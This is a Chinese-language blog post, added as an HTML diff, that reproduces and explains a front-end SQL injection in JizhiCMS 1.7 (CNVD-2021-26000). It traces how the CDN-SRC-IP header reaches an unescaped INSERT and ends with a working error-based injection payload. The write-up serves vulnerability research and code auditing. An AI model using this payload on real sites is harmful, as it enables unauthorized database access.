@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      极致cms1.7 前台SQL注入（CNVD-2021-26000） 
+      
+      
+      |
+    
+     N0puple&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/001.ico">
+    <link rel="icon" href="/images/001.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">N0puple</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">朋友</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">极致cms1.7 前台SQL注入（CNVD-2021-26000）</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-07-04 23:33:21
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="漏洞复现">
+                    <b>#</b> 漏洞复现
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/php/" title="php">
+                    <b>#</b> php
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E6%9E%81%E8%87%B4cms/" title="极致cms">
+                    <b>#</b> 极致cms
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
+                    <b>#</b> sql注入
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/cnvd/" title="cnvd">
+                    <b>#</b> cnvd
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>最近在 CNVD 上看到的，后边学弟给了一份大佬的分析文章，可惜后来找不到了，可以前台 <code>SQL</code> 注入，比较有意思。</p>
+<h3 id="CNVD编号"><a href="#CNVD编号" class="headerlink" title="CNVD编号"></a>CNVD编号</h3><p>CNVD-2021-26000</p>
+<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>既然说是前台 <code>SQL</code> 注入，那么漏洞应该是出在 <code>Home</code> 文件夹下，那么就重点观察这下面的 <code>Controller</code> </p>
+<p>这里的 <code>SQL</code> 都是这样处理的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M(<span class="string">&#x27;message&#x27;</span>)-&gt;add(<span class="variable">$w</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里的话，M 是一个函数，主要用来获取一个新的实例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">M</span>(<span class="params"><span class="variable">$name</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>))&#123;</span><br><span class="line">		<span class="variable">$path</span> = <span class="string">&#x27;FrPHP\lib\\Model&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$path</span>::getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$name</span> = ucfirst(<span class="variable">$name</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$name</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;缺少模型类！&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$table</span> = <span class="variable">$name</span>;</span><br><span class="line">		<span class="variable">$name</span> = APP_HOME.<span class="string">&#x27;\\&#x27;</span>.HOME_MODEL.<span class="string">&#x27;\\&#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;Model&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(!class_exists(<span class="variable">$name</span>))&#123;</span><br><span class="line">			<span class="variable">$path</span> = <span class="string">&#x27;FrPHP\lib\\Model&#x27;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$path</span>::getInstance(<span class="variable">$table</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$name</span>::getInstance(<span class="variable">$table</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大致意思是实例化 <code>Model</code>  类，并初始化数据表的名字，这个类在 <code>FrPHP/lib/Model.php</code>，这里提供了<code>add</code>, <code>delete</code> , <code>find</code>, <code>update</code> 等函数，这些函数分别实现了增删查改</p>
+<p>接下来我们关注跟数据库操作有关的输入，其实我们可以直接，大部分的输入都是由 <code>frparam</code> 方法处理的，我们来看看这个方法，位于 <code>FrPHP/lib/Controller.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">frparam</span>(<span class="params"><span class="variable">$str</span>=<span class="literal">null</span>, <span class="variable">$int</span>=<span class="number">0</span>,<span class="variable">$default</span> = <span class="literal">FALSE</span>, <span class="variable">$method</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;_data;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span>===<span class="literal">null</span>) <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">if</span>(!array_key_exists(<span class="variable">$str</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable">$default</span>===<span class="literal">FALSE</span>)?<span class="literal">false</span>:<span class="variable">$default</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$method</span>===<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$data</span>[<span class="variable">$str</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$method</span> = strtolower(<span class="variable">$method</span>);</span><br><span class="line">        <span class="keyword">switch</span>(<span class="variable">$method</span>)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="variable">$str</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;post&#x27;</span>:</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$_POST</span>[<span class="variable">$str</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;cookie&#x27;</span>:</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$_COOKIE</span>[<span class="variable">$str</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> format_param(<span class="variable">$value</span>,<span class="variable">$int</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 <code>$value</code> 的值可以来自于两部分，第一可以从 <code>$this-&gt;_data</code>中取出，而这个 <code>$this-&gt;_data</code> 来自于哪里呢，可以追溯到父类的初始化 <code>FrPHP/lib/Controller.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$param</span>=<span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_controller = APP_CONTROLLER;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_action = APP_ACTION;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_data = <span class="variable">$param</span>;</span><br></pre></td></tr></table></figure>
+
+<p>也就是父类在初始化的时候传进来的值，我们可以搜索全局的 <code>controller</code> 初始化，发现位于 <code>FrPHP/Fr.php</code> 342 行 ，朝上看就可以看到，是从这里传值进来的</p>
+<p>第二是如果存在 <code>$method</code> 时，可以取出相应的值，最后会执行函数 <code>format_param($value,$int)</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">format_param</span>(<span class="params"><span class="variable">$value</span>=<span class="literal">null</span>,<span class="variable">$int</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$value</span>==<span class="literal">null</span>)&#123; <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;&#125;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$int</span>)&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//整数</span></span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">int</span>)<span class="variable">$value</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//字符串</span></span><br><span class="line">			<span class="variable">$value</span>=htmlspecialchars(trim(<span class="variable">$value</span>), ENT_QUOTES);</span><br><span class="line">			<span class="keyword">if</span>(!get_magic_quotes_gpc())<span class="variable">$value</span> = addslashes(<span class="variable">$value</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//数组</span></span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$value</span>==<span class="string">&#x27;&#x27;</span>)<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			array_walk_recursive(<span class="variable">$value</span>, <span class="string">&quot;array_format&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//浮点</span></span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">float</span>)<span class="variable">$value</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="keyword">if</span>(!get_magic_quotes_gpc())<span class="variable">$value</span> = addslashes(<span class="variable">$value</span>);</span><br><span class="line">			<span class="keyword">return</span> trim(<span class="variable">$value</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会根据传进来的 <code>int</code> 来判断是哪种类型的值，然后做对应的处理，这样防止了很多漏洞可能的发生，这里过滤的还是比较严格的，整数就会强行转整数，字符串就会<code>html</code> 实体化与转义，其他的也类似。数组会进入函数 <code>array_format</code> 进行 <code>html</code> 实体化等处理，这里有可能有问题的一点是，如果传进来的数组中有数字类型的，那有可能这个处理就不会起到作用，但这不是本文漏洞的重点</p>
+<p>现在来找不依靠 <code>frparam</code> 方法可以直接传值进入<code>sql</code> 语句的点，成功找到一处，位于 <code>Home/c/MessageController.php</code> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$w</span> = <span class="keyword">$this</span>-&gt;frparam();</span><br><span class="line">    <span class="variable">$w</span> = get_fields_data(<span class="variable">$w</span>,<span class="string">&#x27;message&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$w</span>[<span class="string">&#x27;body&#x27;</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">&#x27;body&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>);</span><br><span class="line">    <span class="variable">$w</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">&#x27;user&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>);</span><br><span class="line">    <span class="variable">$w</span>[<span class="string">&#x27;tel&#x27;</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">&#x27;tel&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>);</span><br><span class="line">    <span class="variable">$w</span>[<span class="string">&#x27;aid&#x27;</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">&#x27;aid&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;POST&#x27;</span>);</span><br><span class="line">    <span class="variable">$w</span>[<span class="string">&#x27;tid&#x27;</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">&#x27;tid&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;POST&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;webconf[<span class="string">&#x27;autocheckmessage&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$w</span>[<span class="string">&#x27;isshow&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$w</span>[<span class="string">&#x27;isshow&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$w</span>[<span class="string">&#x27;ip&#x27;</span>] = GetIP();</span><br><span class="line">    <span class="variable">$w</span>[<span class="string">&#x27;addtime&#x27;</span>] = time();</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$res</span> = M(<span class="string">&#x27;message&#x27;</span>)-&gt;add(<span class="variable">$w</span>);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到，<code>$w</code> 数组会进入 <code>add</code> 方法，前面的值都是从 <code>frparam</code> 中获取，但是注意这里</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>[<span class="string">&#x27;ip&#x27;</span>] = GetIP();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">  <span class="built_in">static</span> <span class="variable">$ip</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CDN_SRC_IP&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CDN_SRC_IP&#x27;</span>];</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>]) &amp;&amp; preg_match(<span class="string">&#x27;/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">  &#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) <span class="keyword">AND</span> preg_match_all(<span class="string">&#x27;#\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;#s&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>], <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$matches</span>[<span class="number">0</span>] <span class="keyword">AS</span> <span class="variable">$xip</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;#^(10|172\.16|192\.168)\.#&#x27;</span>, <span class="variable">$xip</span>)) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$xip</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到 <code>$ip</code> 的值可以由多个 <code>$_SERVER</code> 中的值得到，其他的值都不好伪造，但是我们可以伪造这个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CDN_SRC_IP&#x27;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>查阅资料知道，我们可以通过添加 <code>header</code> 来伪造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CDN-SRC-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>这里没有规范他的输入，因此此处输入可控，最后进入 <code>$res = M(&#39;message&#39;)-&gt;add($w);</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$row</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(!is_array(<span class="variable">$row</span>))<span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="variable">$row</span> = <span class="keyword">$this</span>-&gt;__prepera_format(<span class="variable">$row</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$row</span>))<span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$value</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="variable">$cols</span>[] = <span class="variable">$key</span>;</span><br><span class="line">            <span class="variable">$vals</span>[] = <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$col</span> = join(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$cols</span>);</span><br><span class="line">    <span class="variable">$val</span> = join(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$vals</span>);</span><br><span class="line">    <span class="variable">$table</span> = <span class="built_in">self</span>::<span class="variable">$table</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">&#123;$table&#125;</span> (<span class="subst">&#123;$col&#125;</span>) VALUES (<span class="subst">&#123;$val&#125;</span>)&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>( <span class="literal">FALSE</span> != <span class="keyword">$this</span>-&gt;runSql(<span class="variable">$sql</span>) )&#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$newinserid</span> = <span class="keyword">$this</span>-&gt;db-&gt;lastInsertId() )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$newinserid</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="keyword">$this</span>-&gt;find(<span class="variable">$row</span>, <span class="string">&quot;<span class="subst">&#123;$this-&gt;primary&#125;</span> DESC&quot;</span>,<span class="keyword">$this</span>-&gt;primary);</span><br><span class="line">            <span class="keyword">return</span> array_pop(<span class="variable">$a</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个数据库代码没有什么过滤的地方，比较常规的数据库插入，就不看代码了，来张截图</p>
+<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210705223529.png"></p>
+<p>很明显，可以报错注入，留个 <code>payload</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CDN<span class="operator">-</span>SRC<span class="operator">-</span>IP: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&#x27; or updatexml(1,concat(0x7e,database(),0x7e),0) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个是看过大佬的文章后，找不到文章了，只好自己从头开始审计，也是比较好的运气，重新找到了这处漏洞，从这处漏洞可以知道，不仅仅只有 <code>GET</code> ，<code>POST</code>，<code>COOKIE</code> 可以进行操作，还有其他的也是可以的，还有就是一个<code>CMS</code> 中，可能大部分都会用同一个过滤比较严格的函数处理，但是还是会有漏网之鱼。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/07/02/DedecmsV5-7-SP2-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-07-04 23:33:21
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="漏洞复现">
+                        <b>#</b> 漏洞复现
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/php/" title="php">
+                        <b>#</b> php
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E6%9E%81%E8%87%B4cms/" title="极致cms">
+                        <b>#</b> 极致cms
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
+                        <b>#</b> sql注入
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/cnvd/" title="cnvd">
+                        <b>#</b> cnvd
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
